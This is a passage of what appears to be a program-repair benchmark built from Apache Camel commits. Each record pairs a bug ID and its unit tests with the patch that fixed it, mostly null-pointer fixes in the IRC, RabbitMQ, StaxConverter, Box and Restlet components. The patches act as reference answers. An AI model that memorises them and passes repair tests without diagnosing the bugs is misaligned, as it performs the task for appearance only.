GoogleMailComponent component = new GoogleMailComponent(context);\n+        context.addComponent(\"google-mail\", component);\n+\n+        return context;\n+    }\n+    \n+    @Test\n+    public void testConfiguration() throws Exception {\n+        GoogleMailEndpoint endpoint = getMandatoryEndpoint(TEST_URI, GoogleMailEndpoint.class);\n+        GoogleMailConfiguration configuration = endpoint.getConfiguration();\n+        assertNotNull(configuration);\n+        assertEquals(\"a\", configuration.getClientId());\n+        assertEquals(\"b\", configuration.getClientSecret());\n+        assertEquals(\"c\", configuration.getApplicationName());\n+        assertEquals(\"d\", configuration.getAccessToken());\n+        assertEquals(\"e\", configuration.getRefreshToken());        \n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() {\n+                // test route for send\n+                from(\"direct://SEND\").to(TEST_URI);\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/5d79ddc352d5a5266d359dc1c2a597184343abd4/components/camel-google-mail/src/test/java/org/apache/camel/component/google/mail/GmailConfigurationTest.java",
                "sha": "cc53619f776742eeaa99d0e7ba3e11b16bc0dcd2",
                "status": "added"
            }
        ],
        "message": "CAMEL-10381 - fix NPE from component configuration",
        "parent": "https://github.com/apache/camel/commit/da614b730dc2097357174cb6ed22c6ef535e67cc",
        "patched_files": [
            "GoogleMailEndpoint.java",
            "GoogleMailComponent.java",
            "pom.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "GmailConfigurationTest.java"
        ]
    },
    "camel_5ff0eb1": {
        "bug_id": "camel_5ff0eb1",
        "commit": "https://github.com/apache/camel/commit/5ff0eb17a6194dbc898e9190a8f9c0cc317771be",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/5ff0eb17a6194dbc898e9190a8f9c0cc317771be/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcMessage.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcMessage.java?ref=5ff0eb17a6194dbc898e9190a8f9c0cc317771be",
                "deletions": 0,
                "filename": "components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcMessage.java",
                "patch": "@@ -39,13 +39,15 @@ public IrcMessage(String messageType, IRCUser user, String message) {\n         this.messageType = messageType;\n         this.user = user;\n         this.message = message;\n+        setBody(message);\n     }\n \n     public IrcMessage(String messageType, String target, IRCUser user, String message) {\n         this.messageType = messageType;\n         this.target = target;\n         this.user = user;\n         this.message = message;\n+        setBody(message);\n     }\n \n     public IrcMessage(String messageType, String target, IRCUser user, String whoWasKickedNick, String message) {\n@@ -54,6 +56,7 @@ public IrcMessage(String messageType, String target, IRCUser user, String whoWas\n         this.user = user;\n         this.whoWasKickedNick = whoWasKickedNick;\n         this.message = message;\n+        setBody(message);\n     }\n \n     public IrcMessage(String messageType, String target, IRCUser user) {\n@@ -67,6 +70,7 @@ public IrcMessage(String messageType, int num, String value, String message) {\n         this.num = num;\n         this.value = value;\n         this.message = message;\n+        setBody(message);\n     }\n \n     public String getMessageType() {",
                "raw_url": "https://github.com/apache/camel/raw/5ff0eb17a6194dbc898e9190a8f9c0cc317771be/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcMessage.java",
                "sha": "be4bc8a00217ba0c0e381e2c9749a1cba348f846",
                "status": "modified"
            },
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/5ff0eb17a6194dbc898e9190a8f9c0cc317771be/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcProducer.java",
                "changes": 23,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcProducer.java?ref=5ff0eb17a6194dbc898e9190a8f9c0cc317771be",
                "deletions": 11,
                "filename": "components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcProducer.java",
                "patch": "@@ -50,16 +50,18 @@ public void process(Exchange exchange) throws Exception {\n             throw new RuntimeCamelException(\"Lost connection to \" + connection.getHost());\n         }\n \n-        if (isMessageACommand(msg)) {\n-            LOG.debug(\"Sending command: {}\", msg);\n-            connection.send(msg);\n-        } else if (targetChannel != null) {\n-            LOG.debug(\"Sending to: {} message: {}\", targetChannel, msg);\n-            connection.doPrivmsg(targetChannel, msg);\n-        } else {\n-            for (IrcChannel channel : endpoint.getConfiguration().getChannels()) {\n-                LOG.debug(\"Sending to: {} message: {}\", channel, msg);\n-                connection.doPrivmsg(channel.getName(), msg);\n+        if (msg != null) {\n+            if (isMessageACommand(msg)) {\n+                LOG.debug(\"Sending command: {}\", msg);\n+                connection.send(msg);\n+            } else if (targetChannel != null) {\n+                LOG.debug(\"Sending to: {} message: {}\", targetChannel, msg);\n+                connection.doPrivmsg(targetChannel, msg);\n+            } else {\n+                for (IrcChannel channel : endpoint.getConfiguration().getChannels()) {\n+                    LOG.debug(\"Sending to: {} message: {}\", channel, msg);\n+                    connection.doPrivmsg(channel.getName(), msg);\n+                }\n             }\n         }\n     }\n@@ -72,7 +74,6 @@ protected void doStart() throws Exception {\n         endpoint.joinChannels();\n     }\n \n-\n     @Override\n     protected void doStop() throws Exception {\n         if (connection != null) {",
                "raw_url": "https://github.com/apache/camel/raw/5ff0eb17a6194dbc898e9190a8f9c0cc317771be/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcProducer.java",
                "sha": "a129be94a65f55b8586dafc0e0a34d9a7411fdfa",
                "status": "modified"
            }
        ],
        "message": "Fix potential NPE and set body instead of lazy.",
        "parent": "https://github.com/apache/camel/commit/7253ae98ffe98042733ec243bd3535e9270b8d7c",
        "patched_files": [
            "IrcProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "IrcProducerTest.java"
        ]
    },
    "camel_60c5a37": {
        "bug_id": "camel_60c5a37",
        "commit": "https://github.com/apache/camel/commit/60c5a37308f23b271143f4c49ab20405ecec944d",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/60c5a37308f23b271143f4c49ab20405ecec944d/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=60c5a37308f23b271143f4c49ab20405ecec944d",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -326,8 +326,13 @@ public Component getComponent(String name) {\n         if (componentType.isInstance(component)) {\n             return componentType.cast(component);\n         } else {\n-            throw new IllegalArgumentException(\"Found component of type: \" \n-                + component.getClass() + \" instead of expected: \" + componentType);\n+            String message;\n+            if (component == null) {\n+                message = \"Did not find component given by the name: \" + name;\n+            } else {\n+                message = \"Found component of type: \" + component.getClass() + \" instead of expected: \" + componentType;\n+            }\n+            throw new IllegalArgumentException(message);\n         }\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/60c5a37308f23b271143f4c49ab20405ecec944d/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "3b8594f10c670e62683b63efd88172983f41961d",
                "status": "modified"
            }
        ],
        "message": "Avoid NPE in the case getComponent(name) returns null.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1241067 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/1a56e25bee187c6712806d9594b6e8084639b751",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_62a2eb6": {
        "bug_id": "camel_62a2eb6",
        "commit": "https://github.com/apache/camel/commit/62a2eb679b8849fa708b87e627fff36b65dc2ecd",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/62a2eb679b8849fa708b87e627fff36b65dc2ecd/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQEndpoint.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQEndpoint.java?ref=62a2eb679b8849fa708b87e627fff36b65dc2ecd",
                "deletions": 1,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQEndpoint.java",
                "patch": "@@ -126,7 +126,7 @@ public Connection connect(ExecutorService executor) throws IOException {\n         }\n     }\n \n-    private ConnectionFactory getOrCreateConnectionFactory() {\n+    protected ConnectionFactory getOrCreateConnectionFactory() {\n         if (connectionFactory == null) {\n             ConnectionFactory factory = new ConnectionFactory();\n             factory.setUsername(getUsername());",
                "raw_url": "https://github.com/apache/camel/raw/62a2eb679b8849fa708b87e627fff36b65dc2ecd/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQEndpoint.java",
                "sha": "272df4138950e6de8f0e48de2d26fdc735bcdb25",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/62a2eb679b8849fa708b87e627fff36b65dc2ecd/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQEndpointTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQEndpointTest.java?ref=62a2eb679b8849fa708b87e627fff36b65dc2ecd",
                "deletions": 2,
                "filename": "components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQEndpointTest.java",
                "patch": "@@ -132,8 +132,8 @@ public void brokerEndpointAddressesSettings() throws Exception {\n     }\n \n     private ConnectionFactory createConnectionFactory(String uri) {\n-        RabbitMQEndpoint endpoint = context.getEndpoint(uri, RabbitMQEndpoint.class); \n-        return endpoint.getConnectionFactory();\n+        RabbitMQEndpoint endpoint = context.getEndpoint(uri, RabbitMQEndpoint.class);\n+        return endpoint.getOrCreateConnectionFactory();\n     }\n \n     @Test",
                "raw_url": "https://github.com/apache/camel/raw/62a2eb679b8849fa708b87e627fff36b65dc2ecd/components/camel-rabbitmq/src/test/java/org/apache/camel/component/rabbitmq/RabbitMQEndpointTest.java",
                "sha": "86a7bcc58faef120ba725cc8465a7fdcaaf401a8",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7384 Fixed the NPE of camel-rabbitmq test",
        "parent": "https://github.com/apache/camel/commit/a7ea864d23e4b47cef8056a446ea4e7344c62ee7",
        "patched_files": [
            "RabbitMQEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RabbitMQEndpointTest.java"
        ]
    },
    "camel_644c1f0": {
        "bug_id": "camel_644c1f0",
        "commit": "https://github.com/apache/camel/commit/644c1f0ab894fbd8c33050cd354a38bbb7acac2a",
        "file": [
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/644c1f0ab894fbd8c33050cd354a38bbb7acac2a/camel-core/src/main/java/org/apache/camel/converter/jaxp/StaxConverter.java",
                "changes": 14,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/converter/jaxp/StaxConverter.java?ref=644c1f0ab894fbd8c33050cd354a38bbb7acac2a",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/converter/jaxp/StaxConverter.java",
                "patch": "@@ -167,7 +167,12 @@ public XMLStreamReader createXMLStreamReader(InputStream in) throws XMLStreamExc\n     public XMLStreamReader createXMLStreamReader(InputStream in, Exchange exchange) throws XMLStreamException {\n         XMLInputFactory factory = getInputFactory();\n         try {\n-            return factory.createXMLStreamReader(IOHelper.buffered(in), IOHelper.getCharsetName(exchange, false));\n+            String charsetName = IOHelper.getCharsetName(exchange, false);\n+            if (charsetName == null) {\n+                return factory.createXMLStreamReader(IOHelper.buffered(in));\n+            } else {\n+                return factory.createXMLStreamReader(IOHelper.buffered(in), charsetName);\n+            }\n         } finally {\n             returnXMLInputFactory(factory);\n         }\n@@ -236,7 +241,12 @@ public XMLEventReader createXMLEventReader(InputStream in) throws XMLStreamExcep\n     public XMLEventReader createXMLEventReader(InputStream in, Exchange exchange) throws XMLStreamException {\n         XMLInputFactory factory = getInputFactory();\n         try {\n-            return factory.createXMLEventReader(IOHelper.buffered(in), IOHelper.getCharsetName(exchange, false));\n+            String charsetName = IOHelper.getCharsetName(exchange, false);\n+            if (charsetName == null) {\n+                return factory.createXMLEventReader(IOHelper.buffered(in));\n+            } else {\n+                return factory.createXMLEventReader(IOHelper.buffered(in), charsetName);\n+            }\n         } finally {\n             returnXMLInputFactory(factory);\n         }",
                "raw_url": "https://github.com/apache/camel/raw/644c1f0ab894fbd8c33050cd354a38bbb7acac2a/camel-core/src/main/java/org/apache/camel/converter/jaxp/StaxConverter.java",
                "sha": "ca16a11f6329989c3d8ce8cc29b29fd4b492c010",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/644c1f0ab894fbd8c33050cd354a38bbb7acac2a/camel-core/src/test/java/org/apache/camel/converter/jaxp/StaxConverterTest.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/converter/jaxp/StaxConverterTest.java?ref=644c1f0ab894fbd8c33050cd354a38bbb7acac2a",
                "deletions": 3,
                "filename": "camel-core/src/test/java/org/apache/camel/converter/jaxp/StaxConverterTest.java",
                "patch": "@@ -58,7 +58,7 @@ public void testEncodingXmlEventReader() throws Exception {\n             output = new ByteArrayOutputStream();\n             // ensure UTF-8 encoding\n             Exchange exchange = new DefaultExchange(context);\n-            exchange.setProperty(Exchange.CHARSET_NAME, UTF_8.name());\n+            //exchange.setProperty(Exchange.CHARSET_NAME, ISO_8859_1.toString());\n             writer = context.getTypeConverter().mandatoryConvertTo(XMLEventWriter.class, exchange, output);\n             while (reader.hasNext()) {\n                 writer.add(reader.nextEvent());\n@@ -74,7 +74,7 @@ public void testEncodingXmlEventReader() throws Exception {\n         assertNotNull(output);\n \n         String result = new String(output.toByteArray(), UTF_8.name());\n-\n+        System.out.println(result);\n         boolean equals = TEST_XML_WITH_XML_HEADER.equals(result) || TEST_XML_WITH_XML_HEADER_ISO_8859_1.equals(result);\n         assertTrue(\"Should match header\", equals);\n     }\n@@ -93,7 +93,7 @@ public void testEncodingXmlStreamReader() throws Exception {\n             output = new ByteArrayOutputStream();\n             // ensure UTF-8 encoding\n             Exchange exchange = new DefaultExchange(context);\n-            exchange.setProperty(Exchange.CHARSET_NAME, UTF_8.name());\n+            //exchange.setProperty(Exchange.CHARSET_NAME, UTF_8.name());\n             writer = context.getTypeConverter().mandatoryConvertTo(XMLStreamWriter.class, exchange, output);\n             // copy to writer\n             while (reader.hasNext()) {",
                "raw_url": "https://github.com/apache/camel/raw/644c1f0ab894fbd8c33050cd354a38bbb7acac2a/camel-core/src/test/java/org/apache/camel/converter/jaxp/StaxConverterTest.java",
                "sha": "3a299af6357b1ab79e04ef2d945df6ce2ca733cc",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7025 fixed the NPE of StaxConverter",
        "parent": "https://github.com/apache/camel/commit/08a6f456b97b24cc49d4b95c0da576795c3402ec",
        "patched_files": [
            "StaxConverter.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "StaxConverterTest.java"
        ]
    },
    "camel_646e710": {
        "bug_id": "camel_646e710",
        "commit": "https://github.com/apache/camel/commit/646e7106ee24b511b48b9d7258c30b99f5d7b7fc",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/646e7106ee24b511b48b9d7258c30b99f5d7b7fc/components/camel-box/src/main/java/org/apache/camel/component/box/internal/LoginAuthFlowUI.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-box/src/main/java/org/apache/camel/component/box/internal/LoginAuthFlowUI.java?ref=646e7106ee24b511b48b9d7258c30b99f5d7b7fc",
                "deletions": 6,
                "filename": "components/camel-box/src/main/java/org/apache/camel/component/box/internal/LoginAuthFlowUI.java",
                "patch": "@@ -66,8 +66,6 @@\n     private final BoxConfiguration configuration;\n     private final BoxClient boxClient;\n \n-    private IAuthFlowListener listener;\n-\n     public LoginAuthFlowUI(BoxConfiguration configuration, BoxClient boxClient) {\n         this.configuration = configuration;\n         this.boxClient = boxClient;\n@@ -153,7 +151,6 @@ public void authenticate(IAuthFlowListener listener) {\n             if (!csrfId.equals(state)) {\n                 final SecurityException e = new SecurityException(\"Invalid CSRF code!\");\n                 listener.onAuthFlowException(e);\n-                this.listener.onAuthFlowException(e);\n             } else {\n \n                 // get authorization code\n@@ -168,19 +165,17 @@ public void authenticate(IAuthFlowListener listener) {\n                 final OAuthDataMessage authDataMessage = new OAuthDataMessage(oAuthToken,\n                     boxClient.getJSONParser(), boxClient.getResourceHub());\n                 listener.onAuthFlowEvent(OAuthEvent.OAUTH_CREATED, authDataMessage);\n-                this.listener.onAuthFlowEvent(OAuthEvent.OAUTH_CREATED, authDataMessage);\n             }\n \n         } catch (Exception e) {\n             // forward login exceptions to listener\n             listener.onAuthFlowException(e);\n-            this.listener.onAuthFlowException(e);\n         }\n     }\n \n     @Override\n     public void addAuthFlowListener(IAuthFlowListener listener) {\n-        this.listener = listener;\n+        throw new UnsupportedOperationException(\"addAuthFlowListener\");\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/646e7106ee24b511b48b9d7258c30b99f5d7b7fc/components/camel-box/src/main/java/org/apache/camel/component/box/internal/LoginAuthFlowUI.java",
                "sha": "babda28401b1e330d1eed46e777cb7048efc857a",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/646e7106ee24b511b48b9d7258c30b99f5d7b7fc/components/camel-box/src/test/java/org/apache/camel/component/box/IBoxCollaborationsManagerIntegrationTest.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-box/src/test/java/org/apache/camel/component/box/IBoxCollaborationsManagerIntegrationTest.java?ref=646e7106ee24b511b48b9d7258c30b99f5d7b7fc",
                "deletions": 3,
                "filename": "components/camel-box/src/test/java/org/apache/camel/component/box/IBoxCollaborationsManagerIntegrationTest.java",
                "patch": "@@ -29,10 +29,10 @@\n import com.box.boxjavalibv2.dao.BoxCollaborationRole;\n import com.box.boxjavalibv2.requests.requestobjects.BoxCollabRequestObject;\n import com.box.boxjavalibv2.requests.requestobjects.BoxGetAllCollabsRequestObject;\n+\n import org.apache.camel.builder.RouteBuilder;\n import org.apache.camel.component.box.internal.BoxApiCollection;\n import org.apache.camel.component.box.internal.IBoxCollaborationsManagerApiMethod;\n-import org.junit.Ignore;\n import org.junit.Test;\n import org.slf4j.Logger;\n import org.slf4j.LoggerFactory;\n@@ -79,7 +79,7 @@ public void testGetAllCollaborations() throws Exception {\n                 BoxGetAllCollabsRequestObject.getAllCollaborationsRequestObject(BoxCollaboration.STATUS_PENDING);\n \n         List result = requestBody(\"direct://GETALLCOLLABORATIONS\", collabRequest);\n-        assertNotNull(\"getAllCollaborations: \" + result);\n+        assertNotNull(\"getAllCollaborations: \", result);\n         LOG.debug(\"getAllCollaborations: \" + result);\n     }\n \n@@ -102,7 +102,6 @@ public void testGetCollaboration() throws Exception {\n         }\n     }\n \n-    @Ignore(\"BoxClient SDK has a bug in UpdateCollaborationRequest.java, the URI constant should be collaborations\")\n     @Test\n     public void testUpdateCollaboration() throws Exception {\n         final BoxCollaboration collaboration = createCollaboration();",
                "raw_url": "https://github.com/apache/camel/raw/646e7106ee24b511b48b9d7258c30b99f5d7b7fc/components/camel-box/src/test/java/org/apache/camel/component/box/IBoxCollaborationsManagerIntegrationTest.java",
                "sha": "2bcb34ecd959d4b72be82782c855f8932b55ab33",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/646e7106ee24b511b48b9d7258c30b99f5d7b7fc/parent/pom.xml",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/parent/pom.xml?ref=646e7106ee24b511b48b9d7258c30b99f5d7b7fc",
                "deletions": 1,
                "filename": "parent/pom.xml",
                "patch": "@@ -71,7 +71,7 @@\n     <beanstalkd-client-version>1.4.6</beanstalkd-client-version>\n     <bsh-version>2.0b5</bsh-version>\n     <bouncycastle-version>1.51</bouncycastle-version>\n-    <boxjavalibv2.version>3.0.9</boxjavalibv2.version>\n+    <boxjavalibv2.version>3.1.7</boxjavalibv2.version>\n     <build-helper-maven-plugin-version>1.8</build-helper-maven-plugin-version>\n     <c3p0-version>0.9.1.2</c3p0-version>\n     <camel-test-spring-artifactId>camel-test-spring</camel-test-spring-artifactId>",
                "raw_url": "https://github.com/apache/camel/raw/646e7106ee24b511b48b9d7258c30b99f5d7b7fc/parent/pom.xml",
                "sha": "c8305c7d2a61bcb5e5025381575ea14d225f1cf5",
                "status": "modified"
            }
        ],
        "message": "CAMEL-8148: Fixed NPE in LoginAuthFlowUI, updated Box.com SDK to 3.1.7",
        "parent": "https://github.com/apache/camel/commit/8f9cf6302f860328fb912e6184ff6ed97d08d4cb",
        "patched_files": [
            "LoginAuthFlowUI.java",
            "pom.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "IBoxCollaborationsManagerIntegrationTest.java"
        ]
    },
    "camel_6a635c0": {
        "bug_id": "camel_6a635c0",
        "commit": "https://github.com/apache/camel/commit/6a635c0d334fccce5c26ce6a13e96f190f5d95b1",
        "file": [
            {
                "additions": 28,
                "blob_url": "https://github.com/apache/camel/blob/6a635c0d334fccce5c26ce6a13e96f190f5d95b1/components/camel-restlet/src/main/java/org/apache/camel/component/restlet/RestletProducer.java",
                "changes": 31,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-restlet/src/main/java/org/apache/camel/component/restlet/RestletProducer.java?ref=6a635c0d334fccce5c26ce6a13e96f190f5d95b1",
                "deletions": 3,
                "filename": "components/camel-restlet/src/main/java/org/apache/camel/component/restlet/RestletProducer.java",
                "patch": "@@ -43,13 +43,13 @@\n     private static final Pattern PATTERN = Pattern.compile(\"\\\\(([\\\\w\\\\.]*)\\\\)\");\n     private Client client;\n     private boolean throwException;\n+    private boolean forceSync;\n \n     public RestletProducer(RestletEndpoint endpoint) throws Exception {\n         super(endpoint);\n         this.throwException = endpoint.isThrowExceptionOnFailure();\n         client = new Client(endpoint.getProtocol());\n         client.setContext(new Context());\n-        client.setConnectTimeout(100);\n         client.getContext().getParameters().add(\"socketTimeout\", String.valueOf(endpoint.getSocketTimeout()));\n         client.getContext().getParameters().add(\"socketConnectTimeoutMs\", String.valueOf(endpoint.getSocketTimeout()));\n     }\n@@ -83,7 +83,30 @@ public boolean process(final Exchange exchange, final AsyncCallback callback) {\n             return true;\n         }\n \n+        // TODO: due to https://github.com/restlet/restlet-framework-java/issues/871\n+        // we force sync behavior until that is fixed, then we can switch back to async support\n+\n+        LOG.debug(\"Sending request: {} for exchangeId: {}\", request, exchange.getExchangeId());\n+        Response response = client.handle(request);\n+        LOG.debug(\"Received response: {} for exchangeId: {}\", response, exchange.getExchangeId());\n+        try {\n+            if (response != null) {\n+                Integer respCode = response.getStatus().getCode();\n+                if (respCode > 207 && throwException) {\n+                    exchange.setException(populateRestletProducerException(exchange, response, respCode));\n+                } else {\n+                    binding.populateExchangeFromRestletResponse(exchange, response);\n+                }\n+            }\n+        } catch (Exception e) {\n+            exchange.setException(e);\n+        }\n+\n+        callback.done(true);\n+        return true;\n+\n         // process the request asynchronously\n+        /*\n         LOG.debug(\"Sending request: {} for exchangeId: {}\", request, exchange.getExchangeId());\n         client.handle(request, new Uniform() {\n             @Override\n@@ -100,12 +123,14 @@ public void handle(Request request, Response response) {\n                     }\n                 } catch (Exception e) {\n                     exchange.setException(e);\n+                } finally {\n+                    callback.done(false);\n                 }\n             }\n         });\n \n-        callback.done(false);\n-        return false;\n+        // we continue routing async\n+        return false;*/\n     }\n \n     private static String buildUri(RestletEndpoint endpoint, Exchange exchange) throws CamelExchangeException {",
                "raw_url": "https://github.com/apache/camel/raw/6a635c0d334fccce5c26ce6a13e96f190f5d95b1/components/camel-restlet/src/main/java/org/apache/camel/component/restlet/RestletProducer.java",
                "sha": "1d28cdbcfc9355f09cba740d9f964d4b1a524a6e",
                "status": "modified"
            },
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/6a635c0d334fccce5c26ce6a13e96f190f5d95b1/components/camel-restlet/src/test/java/org/apache/camel/component/restlet/RestletProducerTimeoutTest.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-restlet/src/test/java/org/apache/camel/component/restlet/RestletProducerTimeoutTest.java?ref=6a635c0d334fccce5c26ce6a13e96f190f5d95b1",
                "deletions": 7,
                "filename": "components/camel-restlet/src/test/java/org/apache/camel/component/restlet/RestletProducerTimeoutTest.java",
                "patch": "@@ -24,12 +24,13 @@\n public class RestletProducerTimeoutTest extends RestletTestSupport {\n \n     @Test\n-    public void testRestletProducerGet() throws Exception {\n+    public void testRestletProducerTimeout() throws Exception {\n         try {\n-            String out = template.requestBodyAndHeader(\"restlet:http://localhost:\" + portNum + \"/users/123/basic?socketTimeout=100\", null, \"id\", 123, String.class);\n-            assertEquals(\"\", null, out);\n+            template.requestBodyAndHeader(\"restlet:http://localhost:\" + portNum + \"/users/123/basic?socketTimeout=100\", null, \"id\", 123, String.class);\n+            fail(\"Should have thrown exception\");\n         } catch (Exception ex) {\n-            System.out.println(\"get the exception\");\n+            // expected\n+            ex.printStackTrace();\n         }\n     }\n \n@@ -38,13 +39,11 @@ protected RouteBuilder createRouteBuilder() throws Exception {\n         return new RouteBuilder() {\n             @Override\n             public void configure() throws Exception {\n-                from(\"direct:start\").to(\"restlet:http://localhost:\" + portNum + \"/users/123/basic?socketTimeout=100\").to(\"log:reply\");\n-\n                 from(\"restlet:http://localhost:\" + portNum + \"/users/{id}/basic\")\n                         .process(new Processor() {\n                             @Override\n                             public void process(Exchange exchange) throws Exception {\n-                                Thread.sleep(1000);\n+                                Thread.sleep(2000);\n                                 exchange.getOut().setBody(\"Here is the response\");\n                             }\n                         });",
                "raw_url": "https://github.com/apache/camel/raw/6a635c0d334fccce5c26ce6a13e96f190f5d95b1/components/camel-restlet/src/test/java/org/apache/camel/component/restlet/RestletProducerTimeoutTest.java",
                "sha": "c670cf4e9582a48075c09190ef29cf130e72ef83",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7310: camel-restlet producer must run in sync mode due NPE bug in restlet which otherwise could cause Camel hanging as the callback is never invoked from restlet.",
        "parent": "https://github.com/apache/camel/commit/fcd2accf2d9417531a19bd0d6527b60001b83f6a",
        "patched_files": [
            "RestletProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RestletProducerTimeoutTest.java"
        ]
    },
    "camel_6c7d57d": {
        "bug_id": "camel_6c7d57d",
        "commit": "https://github.com/apache/camel/commit/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/pom.xml",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/pom.xml?ref=6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02",
                "deletions": 0,
                "filename": "components/camel-cxf/pom.xml",
                "patch": "@@ -211,6 +211,12 @@\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-context</artifactId>\n      </dependency>\n+     \n+     <dependency>\n+       <groupId>org.springframework</groupId>\n+       <artifactId>spring-test</artifactId>\n+       <scope>test</scope>\n+     </dependency>\n \n     <dependency>\n        <groupId>org.springframework</groupId>",
                "raw_url": "https://github.com/apache/camel/raw/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/pom.xml",
                "sha": "f421962a91be09227bae01698de8d723941f3fea",
                "status": "modified"
            },
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfExchange.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfExchange.java?ref=6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfExchange.java",
                "patch": "@@ -55,6 +55,11 @@ public CxfExchange(CamelContext context, ExchangePattern pattern, Exchange excha\n     public CxfExchange(CamelContext context, ExchangePattern pattern) {\n         super(context, pattern);\n     }\n+    \n+    public CxfExchange(CxfExchange exchange) {\n+        super(exchange);\n+        this.exchange = exchange.exchange;      \n+    }\n \n     public CxfExchange(CamelContext context, ExchangePattern pattern, Message inMessage) {\n         this(context, pattern);\n@@ -73,7 +78,7 @@ public CxfExchange(CamelContext context, ExchangePattern pattern, Message inMess\n \n     @Override\n     public org.apache.camel.Exchange newInstance() {\n-        return new CxfExchange(this.getContext(), this.getPattern(), this.getExchange());\n+        return new CxfExchange(this);\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfExchange.java",
                "sha": "962b65037efa06e51101dccdff4c64e8fd63d645",
                "status": "modified"
            },
            {
                "additions": 73,
                "blob_url": "https://github.com/apache/camel/blob/6c7d57dac6e35c6140cbd5cc15cb4fc6c7e2cb02/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/RouteBuilderCxfTracer.java",
                "changes": 73,
